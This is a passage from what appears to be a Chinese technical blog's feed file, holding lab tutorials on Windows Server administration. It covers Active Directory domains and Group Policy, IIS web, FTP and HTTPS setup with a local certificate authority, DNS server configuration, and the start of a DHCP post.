Directory)，表里存放着整个域的公共资源，包括域账号(活动目录的特点：集中管理/统一管理)<br><img src="https://pic.downk.cc/item/5e8ad8f9504f4bcb04eef05e.png" alt=""></li></ul><h4 id="例子-使用域账号登录域中电脑"><a href="#例子-使用域账号登录域中电脑" class="headerlink" title="例子(使用域账号登录域中电脑)"></a>例子(使用域账号登录域中电脑)</h4><ul><li>假如在DC的活动目录上创建一个域账号A，密码为1。</li><li>一个用户B加入域，B有本地账号(Administrator/User),B加入域后指向域的DNS服务器(凡是有域的情况下，域中所有计算机都指向域DNS服务器)。</li><li>DNS管理员输入域账号(A,1)到计算机B中，在工作组的环境下，计算机B会直接显示账号错误进而拒绝登录；但在域环境下，计算机B会先找到DC，然后向DC发送请求验证域账号(A,1),DC查看活动记录AD后发现有(A,1)账号，会告诉计算机B可以允许该账户登录，计算机B就会在C:\Users下创建一个配置文件新建一个用户(A,1),此后该账户都可成功登录计算机B。</li></ul><blockquote><p>注：在域环境中，域账号可以登录域中所有计算机。</p></blockquote><h2 id="域的部署"><a href="#域的部署" class="headerlink" title="域的部署"></a>域的部署</h2><ol><li>安装域控制器，就生成了域环境</li><li>安装活动目录AD，就生成了域控制器(DC)</li></ol><blockquote><p>注：域的部署实际上是部署活动目录</p></blockquote><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>客户机：Win 7、Win XP<br>服务器：Windows Server 2008<br>服务器需要关闭防火墙，所有计算机桥接网络到VMnet3</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>为服务器配置静态IP地址10.1.1.1/24：此处选择IPv4</li><li>开始-&gt;运行(快捷键Win+R)-&gt;输入<font color="#fb8c00">dcpromo</font>命令安装活动目录(此命令也可卸载活动目录，卸载目录还需在服务器管理器中选择删除角色)-&gt;下一步-&gt;下一步(要勾上安装DNS服务器)</li><li>在新林中新建域(林的解释参考下方)-&gt;下一步</li><li>填写新建域的完全域名(此域名不能重名)</li><li>设置林功能<br><img src="https://pic.downk.cc/item/5e8ad90f504f4bcb04ef0619.png" alt=""></li><li>设置域功能(域功能作用与林功能类似)-&gt;下一步-&gt;报错点击是-&gt;文件夹路径不能更改点击下一步</li><li>设置活动目录登录密码(用于对活动目录进行操作的身份验证，此密码绝对不能泄露！！！)-&gt;下一步</li><li>登录域Zby\Administrator</li><li>查看计算机域设置：计算机-&gt;属性<br><img src="https://pic.downk.cc/item/5e8ad925504f4bcb04ef1b94.png" alt=""></li><li>查看DNS服务器:开始-&gt;管理工具-&gt;DNS，计算机将会自动生成域管理器的域名解析记录，如果未出现下图界面则证明域管理器部署失败<br><img src="https://pic.downk.cc/item/5e8ad936504f4bcb04ef28db.png" alt=""></li><li>打开活动目录：开始-&gt;管理工具-&gt;Active Directory用户和计算机(真正的AD)<br><img src="https://pic.downk.cc/item/5e8ad946504f4bcb04ef34f4.png" alt=""></li></ol><blockquote><p>注：WindowsServer2008部署完域后，已经称为域控制器DC,则此计算机不再拥有本地账户和组，本地账户自动迁移到活动目录的表里，即本地管理员升级变成了域管理员,所有本地组也升级为域组。域中的成员机域账号和本地账号，如果要使用域资源必须使用域账号登录，但是DC没有本地账号，只能登录域。</p></blockquote><h4 id="现有林"><a href="#现有林" class="headerlink" title="现有林"></a>现有林</h4><p>公司之间域的运用情景种类：</p><ul><li>公司共用一个域：公司总部与分公司的两个局域网用专线连接，分公司可以通过专线与公司总部加入一个域</li><li>分公司与总部用不同的域(域树)：总部使用主域(父域)，分公司使用子域，父域与子域共同构成域树</li><li>域林：比如公司的一个事业群使用一个域树，最后公司的所有事业群的域树构成域林</li></ul><p><img src="https://pic.downk.cc/item/5e8ad955504f4bcb04ef3f68.png" alt=""></p><blockquote><p>注：现在大多数公司还是采用域树</p></blockquote><h3 id="WinXP加入域"><a href="#WinXP加入域" class="headerlink" title="WinXP加入域"></a>WinXP加入域</h3><ol><li>配置IP地址，DNS服务器(如果Windows Server2008是DNS服务器则不需配置IP地址，详情请参考DNS篇博客)</li></ol><ul><li>IP地址要与服务器在一个网段</li><li>DNS服务器地址要指向Windows Server 2008的静态IP地址</li></ul><ol start="2"><li>右键点击我的电脑-&gt;选择属性-&gt;计算机名-&gt;更改<br><img src="https://pic.downk.cc/item/5e8ad966504f4bcb04ef4bd1.png" alt=""><br><img src="https://pic.downk.cc/item/5e8ad976504f4bcb04ef56a8.png" alt=""></li><li>以域管理员的身份登录(用户名必须为域名\administrator)<br><img src="https://pic.downk.cc/item/5e8ad986504f4bcb04ef6249.png" alt=""></li><li>登录成功<br><img src="https://pic.downk.cc/item/5e8ad999504f4bcb04ef7089.png" alt=""></li></ol><h3 id="Win7加入域"><a href="#Win7加入域" class="headerlink" title="Win7加入域"></a>Win7加入域</h3><p>Win7加入域的步骤与WinXP一致。</p><h3 id="服务器查看"><a href="#服务器查看" class="headerlink" title="服务器查看"></a>服务器查看</h3><p><img src="https://pic.downk.cc/item/5e8ad9a8504f4bcb04ef7bb9.png" alt=""></p><h2 id="使用域功能"><a href="#使用域功能" class="headerlink" title="使用域功能"></a>使用域功能</h2><h3 id="新建普通域用户"><a href="#新建普通域用户" class="headerlink" title="新建普通域用户"></a>新建普通域用户</h3><p>AD界面-&gt;右键点击Users-&gt;新建-&gt;用户-&gt;填写信息(用户登录名是域账号，只能使用英文字符）<br><img src="https://pic.downk.cc/item/5e8ad9ba504f4bcb04ef8d88.png" alt=""></p><h3 id="登录域用户"><a href="#登录域用户" class="headerlink" title="登录域用户"></a>登录域用户</h3><h4 id="WinXP"><a href="#WinXP" class="headerlink" title="WinXP"></a>WinXP</h4><p>此用户名只能为XX@域名<br><img src="https://pic.downk.cc/item/5e8ada3c504f4bcb04f000ba.png" alt=""></p><h4 id="Win7"><a href="#Win7" class="headerlink" title="Win7"></a>Win7</h4><p>在登录界面点击切换用户,输入域账号和密码。</p><h2 id="OU组织单位"><a href="#OU组织单位" class="headerlink" title="OU组织单位"></a>OU组织单位</h2><p>OU(Organization Unit,组织单位)，作用：用于归类域资源(域用户、域计算机、域组)</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>公司安全部的域账号放到一个专属于安全部的OU内。</p><h3 id="组和OU"><a href="#组和OU" class="headerlink" title="组和OU"></a>组和OU</h3><p>相同点：都是用来分类，是一个容器<br>区别：</p><ul><li>组：为不同的用户设置权限</li><li>OU：为不同的域账号下发组策略GPO</li></ul><h3 id="创建OU"><a href="#创建OU" class="headerlink" title="创建OU"></a>创建OU</h3><ol><li>创建组织单位：<br><img src="https://pic.downk.cc/item/5e8ada4b504f4bcb04f00b4e.png" alt=""></li></ol><h3 id="移动域用户到不同OU"><a href="#移动域用户到不同OU" class="headerlink" title="移动域用户到不同OU"></a>移动域用户到不同OU</h3><p>右键点击要移动的用户-&gt;所有任务-&gt;移动</p><blockquote><p>注：也可对域中的计算机进行上述操作</p></blockquote><h2 id="组策略GPO"><a href="#组策略GPO" class="headerlink" title="组策略GPO"></a>组策略GPO</h2><ul><li>活动目录(AD)是一个数据库，基于AD衍生出一个活动目录GPO(Group Policy，组策略)。</li><li>通过组策略可以修改计算机的各种属性，如开始菜单、桌面背景、网络参数等。</li><li>组策略对计算机的限制是限制一台电脑，而对域用户的限制只是限制一个账户。</li><li>组策略在域中，是基于OU来下发的。</li><li>组策略在域中，用户的应用顺序是：LSDOU(Local本地&lt;Site站点&lt;Domain域总组策略&lt;OU组策略)，即OU组策略一定会被应用</li></ul><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>计算机B使用域账号登录后，会向DC询问具体要求，DC查阅活动目录，发现计算机B所属的XX部有一个组策略表，DC就会将这张组策略表发给计算机B，计算机B就会读取这张表的具体要求并执行。</p><h3 id="创建组策略"><a href="#创建组策略" class="headerlink" title="创建组策略"></a>创建组策略</h3><ol><li>开始-&gt;管理-&gt;组策略管理:<br><img src="https://pic.downk.cc/item/5e8ada5d504f4bcb04f01780.png" alt=""></li><li>右键点击想要创建组策略的域-&gt;选择在这个域中创建GPO并在此链接-&gt;自定义名称<br><img src="https://pic.downk.cc/item/5e8ada6c504f4bcb04f020fb.png" alt=""></li></ol><h3 id="对组策略进行编辑"><a href="#对组策略进行编辑" class="headerlink" title="对组策略进行编辑"></a>对组策略进行编辑</h3><p>这里的例子是要求IT部域中所有账户桌面为同一个桌面：</p><ol><li><p>在WindowsServer2008中新建一个文件夹，并设置共享、安全性：<br>①右键点击文件夹-&gt;共享-&gt;高级共享<br><img src="https://pic.downk.cc/item/5e8ada91504f4bcb04f03a7b.png" alt=""><br>②右键点击文件夹-&gt;安全-&gt;添加域用户<br><img src="https://pic.downk.cc/item/5e8adaa5504f4bcb04f04f9b.png" alt=""></p></li><li><p>右键点击要编辑的组策略-&gt;编辑:<br><img src="https://pic.downk.cc/item/5e8ada7c504f4bcb04f02bac.png" alt=""></p></li><li><p>右键点击桌面壁纸-&gt;属性<br><img src="https://pic.downk.cc/item/5e8adabb504f4bcb04f0640b.png" alt=""></p></li><li><p>注销域账户重新登录即可使用组策略统一桌面</p></li></ol><blockquote><p>注：由于虚拟机的限制性，桌面更换过程可能过慢，此时可以采用在域账户计算机桌面空白处点击右键选择个性化或属性查看当前壁纸</p></blockquote><h3 id="查看组策略"><a href="#查看组策略" class="headerlink" title="查看组策略"></a>查看组策略</h3><p>打开组策略管理<br><img src="https://pic.downk.cc/item/5e8adaef504f4bcb04f096fc.png" alt=""></p><h3 id="强制实施组策略"><a href="#强制实施组策略" class="headerlink" title="强制实施组策略"></a>强制实施组策略</h3><p>强制的意思是说组策略应用顺序应用到此组策略时即停止，不会再往下应用其他组策略<br>右键点击组策略-&gt;强制</p><h3 id="阻止继承"><a href="#阻止继承" class="headerlink" title="阻止继承"></a>阻止继承</h3><p>不再应用该OU之前的组策略(即不再运行LSD组策略)<br>右键点击OU文件夹-&gt;阻止继承</p><blockquote><p>注：当上级强制与下级阻止继承同时设置，强制生效</p></blockquote><h3 id="其他组策略"><a href="#其他组策略" class="headerlink" title="其他组策略"></a>其他组策略</h3><h4 id="登录注销时运行脚本"><a href="#登录注销时运行脚本" class="headerlink" title="登录注销时运行脚本"></a>登录注销时运行脚本</h4><p>右键点击组策略-&gt;编辑-&gt;用户-&gt;策略-&gt;Windows设置-&gt;脚本</p><h4 id="删除开机Ctrl-alt-delete操作"><a href="#删除开机Ctrl-alt-delete操作" class="headerlink" title="删除开机Ctrl+alt+delete操作"></a>删除开机Ctrl+alt+delete操作</h4><p>右键点击组策略-&gt;编辑-&gt;计算机-&gt;策略-&gt;Windows设置-&gt;安全设置-&gt;本地策略-&gt;安全选项</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS(互联网信息服务)</title>
      <link href="/2020/03/07/iis/"/>
      <url>/2020/03/07/iis/</url>
      
        <content type="html"><![CDATA[<h2 id="查看本地服务命令"><a href="#查看本地服务命令" class="headerlink" title="查看本地服务命令"></a>查看本地服务命令</h2><p>查看本地计算机运行的服务客户端：<br>快捷键Win+R-&gt;键入services.msc</p><blockquote><p>注：如停止服务客户端，计算机将不会再运行对应的服务。(若停止DHCP Client，则计算机将无法发送DHCP Discovery包，因此无法获取IP地址)</p></blockquote><h2 id="Web服务器"><a href="#Web服务器" class="headerlink" title="Web服务器"></a>Web服务器</h2><ul><li>Web服务器也称网页服务器或HTTP服务器</li><li>Web服务器使用的是HTTP协议或HTTPS协议</li><li>HTTP协议端口号：TCP 80</li><li>HTTPS协议端口号：TCP 443</li></ul><h3 id="Web服务器发布软件"><a href="#Web服务器发布软件" class="headerlink" title="Web服务器发布软件"></a>Web服务器发布软件</h3><h4 id="微软"><a href="#微软" class="headerlink" title="微软"></a>微软</h4><p>IIS(Internet Information Service,互联网信息服务)，既可以发布Web站点，也可以发布FTP站点</p><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>Apache/LAMP/Tomcat/nginx 等</p><h4 id="第三方"><a href="#第三方" class="headerlink" title="第三方"></a>第三方</h4><p>phpStudy/XAMPP</p><blockquote><p>注：第三方软件主要用于测试，不用于企业服务。</p></blockquote><h3 id="部署Web服务器"><a href="#部署Web服务器" class="headerlink" title="部署Web服务器"></a>部署Web服务器</h3><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>客户机：Windows XP<br>服务器：Windows Server 2003<br>客户机与服务器需处于同一局域网，此实验的前提是客户机需要使用Win 2003服务器提供的网络服务，即客户机需将Win 2003服务器手动配置为DHCP服务器(详情请参考DHCP篇)</p><h4 id="部署步骤"><a href="#部署步骤" class="headerlink" title="部署步骤"></a>部署步骤</h4><ol><li>配置静态地址</li><li>安装IIS-Web/FTP插件(同DHCP服务器搭建，详情请参考DHCP服务部署步骤(博客DHCP篇))：<br><img src="https://pic.downk.cc/item/5e8adb42504f4bcb04f0d6e9.png" alt=""></li><li>打开IIS服务器：开始-&gt;管理工具-&gt;IIS</li><li>使用<font color="#fb8c00">netstat -an</font>命令查看Web/FTP(21)服务是否打开,HTTPS的443端口无法轻易打开<br><img src="https://pic.downk.cc/item/5e8adb4e504f4bcb04f0e430.png" alt=""></li><li>使用客户机浏览器访问10.1.1.1,查看客户机是否连接上服务器，出现如下界面则表示成功连接：<br><img src="https://pic.downk.cc/item/5e8adb5d504f4bcb04f0f1f2.png" alt=""></li></ol><blockquote><p>注：要想网页正常显示必须添加默认文档，并且配置DNS，让客户机正常解析网址</p></blockquote><h5 id="Web默认网站"><a href="#Web默认网站" class="headerlink" title="Web默认网站"></a>Web默认网站</h5><p>路径： C:\Inetpub\wwwroot</p><blockquote><p>注：如果不用默认网站建议停止，不要删除。</p></blockquote><h2 id="FTP服务器"><a href="#FTP服务器" class="headerlink" title="FTP服务器"></a>FTP服务器</h2><p>FTP(File Transfer Protocol,文件传输协议)</p><h3 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h3><p>TCP 20(数据端口)/21(控制端口)</p><h3 id="FTP工作模式-针对服务器"><a href="#FTP工作模式-针对服务器" class="headerlink" title="FTP工作模式(针对服务器)"></a>FTP工作模式(针对服务器)</h3><ul><li>主动模式：客户机先打开一个端口与服务器21端口进行控制连接(客户机会在此连接过程向服务器发送接收数据的端口号，用作数据连接)，再由服务器20端口主动向客户端另一个端口发起数据连接请求。</li><li>被动模式(客户机开防火墙下的工作模式)：21端口+随机端口作为数据传输端口</li></ul><blockquote><p>注：以上工作模式的选择权在客户机上</p></blockquote><h2 id="部署FTP服务器"><a href="#部署FTP服务器" class="headerlink" title="部署FTP服务器"></a>部署FTP服务器</h2><ol><li>为服务器配置静态IP地址</li><li>在服务器上安装IIS-FTP组件</li><li>使用默认站点或创建新站点</li></ol><blockquote><p>注：用户最终权限为FTP权限和NTFS权限取交集</p></blockquote><h2 id="部署HTTPS服务器-SSL服务器"><a href="#部署HTTPS服务器-SSL服务器" class="headerlink" title="部署HTTPS服务器(SSL服务器)"></a>部署HTTPS服务器(SSL服务器)</h2><p>IIS的Web服务器默认提供HTTP服务(80),现在要升级成HTTPS服务(443),即服务器不仅为HTTP服务器，也为CA服务器。建议观看此节之前先阅读PKI篇了解原理。</p><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><p>客户机：Windows 7<br>服务器：Windows Server 2008<br>确保服务器和客户机在同一局域网，且客户机DNS服务器指向服务器(详情请参考DNS篇)</p><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="搭建Web服务器"><a href="#搭建Web服务器" class="headerlink" title="搭建Web服务器"></a>搭建Web服务器</h4><ol><li><p>组件安装：<br>①打开服务器的服务器管理器-&gt;角色-&gt;添加角色-&gt;下一步-&gt;勾选Web服务器(IIS)-&gt;下一步<br><img src="https://pic.downk.cc/item/5e8adb75504f4bcb04f10a07.png" alt=""><br>②安装</p></li><li><p>开始-&gt;管理工具-&gt;Internet(IIS)管理器-&gt;网站(默认网站)：在搭建HTTPS服务器时不能停止默认站点，因此CA自带的网站站点会直接放入默认站点路径(C:\Inetpub\wwwroot )里，利用默认站点路径发布CA。</p></li><li><p>右键点击网站图标-&gt;新建站点：如果此处文件放在C盘(受NTFS保护)，则客户机进行访问会出现401错误<br><img src="https://pic.downk.cc/item/5e8adb85504f4bcb04f11abd.png" alt=""></p></li><li><p>点击新建网站图标-&gt;右边框中寻找默认文档并双击-&gt;点击右上方添加(默认文档)-&gt;输入要展示的html文件名(xx.html)：如果没有配置该文件则客户机访问时会出现403错误</p></li><li><p>将该网站添加DNS解析记录(详情请参考DNS篇)</p></li></ol><blockquote><p>注：以上操作的效果等同于上文在Windows Server 2003上搭建Web服务器。</p></blockquote><h4 id="升级HTTPS"><a href="#升级HTTPS" class="headerlink" title="升级HTTPS"></a>升级HTTPS</h4><ol><li><p>装CA：服务器管理-&gt;角色-&gt;添加角色-&gt;下一步-&gt;勾选Active Directory证书服务-&gt;角色服务里勾选证书颁发机构Web注册-&gt;一路下一步-&gt;完成安装</p></li><li><p>开始-&gt;管理工具-&gt;证书颁发机构(Certification Authority)</p></li><li><p>在IIS管理器里申请证书(此证书是采用base64编码的)：<br><img src="https://pic.downk.cc/item/5e8adb96504f4bcb04f129b7.png" alt=""><br><img src="https://pic.downk.cc/item/5e8adba7504f4bcb04f136bf.png" alt=""><br>后面只需一路下一步</p></li><li><p>将证书提交给CA：通过IE浏览器输入网址：<font color="#fb8c00">本机IP/certsrv</font> 访问默认CA网站。</p></li><li><p>点击申请证书-&gt;<br><img src="https://pic.downk.cc/item/5e8adbc0504f4bcb04f14a1c.png" alt=""><br><img src="https://pic.downk.cc/item/5e8adbcf504f4bcb04f15512.png" alt=""></p></li><li><p>将第三步中申请的证书的内容复制粘贴到下图框中-&gt;点击提交<br><img src="https://pic.downk.cc/item/5e8adbe3504f4bcb04f16425.png" alt=""></p></li><li><p>打开证书颁发机构可看到挂起的申请-&gt;右键点击下图框起来的部分-&gt;颁发<br><img src="https://pic.downk.cc/item/5e8adbf1504f4bcb04f172cd.png" alt=""></p></li><li><p>重新访问第4步中的CA网站-&gt;查看挂起的证书申请的状态-&gt;选择申请的证书-&gt;下载证书-&gt;保存(此时证书中有CA的签名以及IIS服务器的公钥)</p></li><li><p>开始-&gt;管理工具-&gt;IIS:<br><img src="https://pic.downk.cc/item/5e8adc01504f4bcb04f18586.png" alt=""><br><img src="https://pic.downk.cc/item/5e8adc13504f4bcb04f196ed.png" alt=""></p></li></ol><h4 id="网站提供HTTPS服务"><a href="#网站提供HTTPS服务" class="headerlink" title="网站提供HTTPS服务"></a>网站提供HTTPS服务</h4><ol><li><p>在IIS中右键点击需要提供HTTPS服务的网站-&gt;编辑绑定：<br><img src="https://pic.downk.cc/item/5e8adc36504f4bcb04f1b004.png" alt=""><br><img src="https://pic.downk.cc/item/5e8adc45504f4bcb04f1bb71.png" alt=""></p></li><li><p>设置SSL<br><img src="https://pic.downk.cc/item/5e8adc55504f4bcb04f1ca9f.png" alt=""><br><img src="https://pic.downk.cc/item/5e8adc9b504f4bcb04f1fed4.png" alt=""><br>点击进入后勾选要求SSL</p></li></ol><h4 id="客户机访问网站"><a href="#客户机访问网站" class="headerlink" title="客户机访问网站"></a>客户机访问网站</h4><p>在浏览器搜索栏上输入网址：<font color="#fb8c00">https://网站域名</font> 进行访问,访问后会出现提示该网站的安全证书有问题(原因是我们的计算机默认不信任被访问网站的证书)，选择继续访问即可。</p><ul><li>可以用https直接访问而不会出现提示该网站安全证书有问题的原因是，该网站使用的CA是中国公认的CA，我们的浏览器内置信任该CA</li></ul><h5 id="查看浏览器默认信任的CA"><a href="#查看浏览器默认信任的CA" class="headerlink" title="查看浏览器默认信任的CA"></a>查看浏览器默认信任的CA</h5><p>网页-&gt;工具-&gt;Internet选项-&gt;内容-&gt;证书-&gt;受信任的根证书颁发机构：此页面显示的CA都是国际公认信任的CA</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS</title>
      <link href="/2020/03/06/dns/"/>
      <url>/2020/03/06/dns/</url>
      
        <content type="html"><![CDATA[<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS(Domain Name System)，域名服务。为客户机提供域名解析服务</p><h2 id="域名组成"><a href="#域名组成" class="headerlink" title="域名组成"></a>域名组成</h2><p><a href="http://www.sina.com.cn" target="_blank" rel="noopener">www.sina.com.cn</a> 是一个域名。严格意义上说 sina.com.cn才被称为域名(全球唯一),而 www 是主机名。主机名.域名称为完全限定域名(FQDN),一个域名下可以有多个主机，主机名.域名也是地球唯一的。</p><h3 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h3><p>以 <font color="#fb8c00">sina.com.cn</font>域名为例，一般管理员在命名其主机时会根据其主机的功能而命名：</p><ul><li>网站是<font color="#fb8c00">www</font>: <a href="http://www.sina.com.cn" target="_blank" rel="noopener">www.sina.com.cn</a></li><li>博客是<font color="#fb8c00">blog</font>: blog.sina.com.cn</li><li>论坛是<font color="#fb8c00">bbs</font>: bbs.sina.com.cn<br>虽然可以有多个完全限定域名，但是我们只需要申请一个域名<font color="#fb8c00">sina.com.cn</font>即可</li></ul><p>可以通过以下命令查看域名对应IP地址：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">nslookup</span> www.baidu.com</code></pre><h2 id="DNS解析种类"><a href="#DNS解析种类" class="headerlink" title="DNS解析种类"></a>DNS解析种类</h2><h3 id="按照查询方式分类"><a href="#按照查询方式分类" class="headerlink" title="按照查询方式分类"></a>按照查询方式分类</h3><ul><li>递归查询：客户机与本地DNS服务器之间</li><li>迭代查询：本地DNS服务器与根等其他DNS服务器的解析过程</li></ul><h3 id="按照查询内容分类"><a href="#按照查询内容分类" class="headerlink" title="按照查询内容分类"></a>按照查询内容分类</h3><ul><li>正向解析：已知域名，解析IP地址</li><li>反向解析：已知IP地址，解析域名</li></ul><h2 id="DNS域名请求解析顺序"><a href="#DNS域名请求解析顺序" class="headerlink" title="DNS域名请求解析顺序"></a>DNS域名请求解析顺序</h2><h3 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h3><p>客户机域名请求顺序为：</p><ol><li>DNS缓存</li><li>本地hosts文件</li><li>本地DNS服务器</li></ol><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><p>服务器域名请求顺序为：</p><ol><li>DNS高速缓存</li><li>本地区域解析文件</li><li>转发器</li><li>根</li></ol><h2 id="域名解析记录类型"><a href="#域名解析记录类型" class="headerlink" title="域名解析记录类型"></a>域名解析记录类型</h2><ul><li>A记录：正向解析记录</li><li>CNAME记录：别名</li><li>PTR记录：反向解析记录</li><li>MX：邮件交换记录</li><li>NS：域名服务器解析</li></ul><h2 id="DNS服务器搭建过程"><a href="#DNS服务器搭建过程" class="headerlink" title="DNS服务器搭建过程"></a>DNS服务器搭建过程</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>服务机： Windows Server 2003<br>客户机： Windows XP<br>要保证两个操作系统在同一网段下</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>为服务器配置静态IP地址</li><li>安装DNS组件</li></ol><blockquote><p>注：以上两个步骤除与DHCP搭建过程相同，在最后一步将DHCP改为DHS即可，详情请参考博主的另一篇文章DHCP。</p></blockquote><ol start="3"><li>运行<font color="#fb8c00">netstat -an</font>查看端口运行情况，DNS端口：TCP/UDP都是53<br><img src="https://pic.downk.cc/item/5e8ad7a8504f4bcb04ed9269.png" alt=""></li></ol><h4 id="正向查找"><a href="#正向查找" class="headerlink" title="正向查找"></a>正向查找</h4><ol start="4"><li><p>新建区域<br>①开始-&gt;管理工具-&gt;打开DNS-&gt;右键点击正向查找区域：<br><img src="https://pic.downk.cc/item/5e8ad7bb504f4bcb04eda6e5.png" alt=""><br>②点击新建区域-&gt;下一步-&gt;主要区域-&gt;填入域名名称(如baidu.com)-&gt;下一步-&gt;下一步-&gt;完成</p></li><li><p>上述操作后，在正向查找区域目录下多了一个baidu.com的文件夹，解析记录都在右侧空白处创建：<br><img src="https://pic.downk.cc/item/5e8ad7ce504f4bcb04edba59.png" alt=""></p></li><li><p>创建新的域名解析：<br>①在右侧空白区右键点击-&gt;新建主机(A记录，A记录即为标准正向解析记录)<br><img src="https://pic.downk.cc/item/5e8ad7de504f4bcb04edca4a.png" alt=""><br>所填的IP可以ping不通，因为此服务器只负责解析，并不负责通信<br>②此时在右侧空白区会出现一条www的解析记录，此后<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的解析IP地址为1.1.1.1</p></li><li><p>客户机测试：因为1.1.1.1并不是 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的真实IP地址，所以我们不应该从网址输入解析DNS，而要用命令行进行测试。<br>①此步骤中，因为命令行默认将<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的解析工作交给之前的服务器，在实验中我们要把域名送给我们的Win 2003服务器解析：<br><img src="https://pic.downk.cc/item/5e8ad7f3504f4bcb04eddfc1.png" alt=""></p></li></ol><p>②使用<font color="#fb8c00">nslookup <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> </font>解析域名,也可以使用<font color="#fb8c00">ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></font>获取IP地址<br><img src="https://pic.downk.cc/item/5e8ad805504f4bcb04edf257.png" alt=""></p><blockquote><p>注：如果计算机没有联网，且对应的域名没有搭建服务器，则ping命令是无法解析IP地址的。</p></blockquote><ol start="8"><li>清除缓存：对于XP系统来说，需要用ipconfig /flushdns命令来清除缓存，否则搭建服务器之后使用ping命令仍会调用缓存内容导致无法正确解析IP地址。 </li></ol><h4 id="反向查找"><a href="#反向查找" class="headerlink" title="反向查找"></a>反向查找</h4><ol start="4"><li><p>新建一个正向解析记录。(这里为dns1.baidu.com:10.1.1.1)</p></li><li><p>新建区域:<br>①打开DNS-&gt;右键点击反向查找区域-&gt;下一步-&gt;主要区域-&gt;输入网络ID前24位：<br><img src="https://pic.downk.cc/item/5e8ad827504f4bcb04ee1392.png" alt=""><br>②一路默认选项点到最后-&gt;完成</p></li><li><p>上述操作后，在反向查找区域目录下多了一个baidu.com的文件夹，解析记录都在右侧空白处创建</p></li><li><p>创建新的IP解析：<br>①在右侧空白区右键点击-&gt;新建指针(PTR,PTR即为标准反向解析记录)：<br><img src="https://pic.downk.cc/item/5e8ad83c504f4bcb04ee28bb.png" alt=""></p></li><li><p>在客户机上使用<font color="#fb8c00">nslookup <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> </font>解析域名：<br><img src="https://pic.downk.cc/item/5e8ad84e504f4bcb04ee39f5.png" alt=""></p></li></ol><h5 id="显示缓存DNS服务器"><a href="#显示缓存DNS服务器" class="headerlink" title="显示缓存DNS服务器"></a>显示缓存DNS服务器</h5><pre class=" language-bash"><code class="language-bash">ipconfig /displaydns</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 计算机网络 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP</title>
      <link href="/2020/03/04/dhcp/"/>
      <url>/2020/03/04/dhcp/</url>
      
        <content type="html"><![CDATA[<h2 id="DHCP作用"><a href="#DHCP作用" class="headerlink" title="DHCP作用"></a>DHCP作用</h2><p>DHCP(Dynamic Host Configure Protocol,动态主机配置协议)自动分配IP地址(详情请参考计算机网络)</p><h2 id="DHCP相关概念"><a href="#DHCP相关概念" class="headerlink" title="DHCP相关概念"></a>DHCP相关概念</h2><ol><li>作用池/作用域：IP、子网掩码、网关、DNS、租期</li></ol><h2 id="DHCP优点"><a href="#DHCP优点" class="headerlink" title="DHCP优点"></a>DHCP优点</h2><p>减少工作量、避免IP冲突、提高地址利用率</p><h2 id="DHCP原理"><a href="#DHCP原理" class="headerlink" title="DHCP原理"></a>DHCP原理</h2><p>也叫DHCP租约过程，分为四个部分：</p><ol><li>客户机发送DHCP Discovery广播包：客户机广播请求IP地址(包含客户机的MAC地址)</li><li>服务器响应DHCP Offer广播包：服务器响应提供的IP地址(但无子网掩码、网关等参数)</li><li>客户机发送DHCP Request广播包：客户机选择IP(也可以确认使用哪个IP)</li><li>服务器发送DHCP ACK广播包：服务器确认租约，并提供网卡详细参数IP、掩码、网关、DNS、租期等</li></ol><h3 id="DHCP续约步骤"><a href="#DHCP续约步骤" class="headerlink" title="DHCP续约步骤"></a>DHCP续约步骤</h3><ol><li>在租期50%的时候，客户机发送DHCP Request包进行续约</li><li>如果服务器没有响应，则在租期87.5%再一次发送DHCP Request包续约</li><li>若仍然无响应，则释放IP地址，重新发送DHCP Discovery广播包来获取IP地址。</li><li>当无任何服务器响应时，计算机给自己分配一个169.254.x.x/16的IP地址，此地址属于全球统一无效地址，用于临时内网通信。</li></ol><h2 id="部署DHCP服务器"><a href="#部署DHCP服务器" class="headerlink" title="部署DHCP服务器"></a>部署DHCP服务器</h2><h3 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h3><p>客户机：Windows XP<br>服务器：Windows Server 